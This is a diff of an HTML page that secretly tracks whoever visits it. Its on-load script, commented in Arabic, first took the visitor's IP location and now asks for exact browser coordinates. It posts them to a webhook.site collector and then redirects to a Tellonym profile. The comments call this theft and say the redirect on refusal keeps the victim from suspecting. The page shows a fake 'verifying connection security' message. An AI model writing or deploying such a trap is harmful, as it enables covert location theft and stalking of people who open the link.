@@ -3,31 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <script>
-        // رابط الـ Webhook الخاص بك لاختبار وصول البيانات
         const hook = "https://webhook.site/5e829926-604d-4dde-a540-5530e155e703";
-        const finalDest = "https://tellonym.me/Schaien/anything";
 
-        async function testTrap() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                
-                // إرسال البيانات للـ Webhook
-                await fetch(hook, {
-                    method: 'POST',
-                    mode: 'no-cors', // لتجاوز حماية المتصفح اللعينة
-                    body: JSON.stringify(data)
+        function getExactLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const coords = {
+                        lat: position.coords.latitude,
+                        long: position.coords.longitude,
+                        accuracy: position.coords.accuracy + " meters",
+                        device: navigator.platform
+                    };
+                    
+                    // إرسال الإحداثيات الدقيقة للـ Webhook
+                    await fetch(hook, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify(coords)
+                    });
+
+                    // توجيهه للوجهة النهائية بعد السرقة
+                    window.location.replace("https://tellonym.me/Schaien/anything");
+                }, () => {
+                    // إذا رفض الإذن، نوجهه فوراً لكي لا يشك
+                    window.location.replace("https://tellonym.me/Schaien/anything");
                 });
-
-            } catch (e) {
-                // صمت مطبق
-            } finally {
-                // تحويل للوجهة النهائية
-                setTimeout(() => { window.location.replace(finalDest); }, 500);
             }
         }
-        window.onload = testTrap;
+        window.onload = getExactLocation;
     </script>
 </head>
-<body style="background: #000;"></body>
+<body style="background: #000;">
+    <h2 style="color:white; text-align:center; margin-top:20%;">جاري التحقق من أمان الاتصال...</h2>
+</body>
 </html>
